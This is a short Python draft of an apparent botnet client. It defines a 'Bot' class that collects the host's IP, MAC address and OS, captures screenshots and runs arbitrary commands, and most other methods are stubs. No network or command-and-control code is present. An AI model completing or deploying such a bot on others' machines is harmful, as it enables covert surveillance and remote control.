import socket
import platform
import pyscreenshot as ImageGrab
from uuid import getnode as get_mac
from subprocess import call

class Bot:
    id = 0
    ip = socket.gethostbyname(socket.gethostname())
    mac = hex(get_mac())
    os = platform.platform()
    im = ''
    count = 0

    def handleFile(self, ip):
        print("test")

    def executeCMD(self, cmd):
        call(cmd)

    def pushFile(self, test):
        print("test")

    def screenshot(self):
        im = ImageGrab.grab()
        im.save('screenshot%d.png' % self.count)
        self.count += 1

    def scan(self):
        print("scan")

    def sleep(self):
        print("sleep")


######IT'S ALL TESTING FROM HERE######

bot1 = Bot()

print("IP: ", bot1.ip)
print("MAC: ", bot1.mac)
print("OS: ", bot1.os)
bot1.screenshot()
bot1.executeCMD("ls")

